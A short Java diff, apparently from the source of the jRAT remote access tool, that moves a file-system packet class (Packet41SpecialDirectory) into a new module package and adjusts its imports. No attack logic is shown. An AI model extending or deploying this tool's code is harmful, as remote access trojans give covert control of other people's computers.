@@ -1,8 +1,8 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets;
 
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 import jrat.common.DropLocations;
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet34CustomDirectory;
 import oslib.OperatingSystem;
 
 public class Packet41SpecialDirectory extends AbstractIncomingPacket {
